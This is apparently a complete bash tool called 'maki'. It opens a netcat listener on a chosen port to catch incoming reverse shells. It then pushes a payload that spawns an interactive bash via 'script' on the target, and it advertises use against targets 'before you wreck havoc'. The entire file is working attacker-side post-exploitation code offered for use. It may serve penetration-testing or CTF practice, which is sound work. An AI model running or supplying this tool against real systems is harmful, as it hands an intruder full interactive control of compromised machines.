#!/usr/bin/bash

banner() {
  cat .makiroll 2>/dev/null
  printf "\033[1;33mmaki v1.0\033[0m -- because dumb shells are dumb!\n"
  printf "\033[1;31mWARNING:\033[0m maki resets your shell, make sure to run maki in a new shell/terminal tab.\n\n"
}

usage() {
  echo "Automatically upgrade dumb reverse shells and (optionally) run scripts on target before you wreck havoc!"
  echo "Usage: $0 [-p <port> | --port <port>] [-i <interface> | --interface <interface>]"
  echo "Example: $0 -p 7878 -i eth0"
}

main() {
  banner

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -p | --port)
        if [[ -n "$2" ]]; then
          PORT="$2"; shift
        else
          echo "$1 requires a port number! (1-65535)"
          exit 1
        fi
      ;;
      -i | --interface)
        if [[ -n "$2" ]]; then
          INTERFACE="$2"; shift
        else
          echo "$1 requires a valid interface!"
          exit 1
        fi
      ;;
      -h | --help)
        usage
        exit 1
      ;;
      *)
        echo "$1 is an unknown flag!"
        usage
        exit 1
    esac
    shift
  done

  if [[ -z "$PORT" ]]; then
    echo "[-p / --port] is a required flag."
    usage
    exit 1
  fi

  if [[ -n "$INTERFACE" ]]; then
    ADDR=$(ip addr show "$INTERFACE" | grep "inet " | awk '{print $2}' | cut -d/ -f1)
    echo "Using address: $ADDR"
  else
    ADDR="0.0.0.0"
  fi

  payload='
    reset
    script -qc /bin/bash /dev/null
    printf "\n[!] Shell shutdown, double press ENTER key to exit gracefully.\n"
    exit
  '

  stty raw -echo; (echo -e "$payload\r\n"; cat) | nc -lnvp "$PORT" -s "$ADDR"; stty sane
  # expect reverse_shell.exp "$PORT" "$ADDR" && reset
}

main "$@"
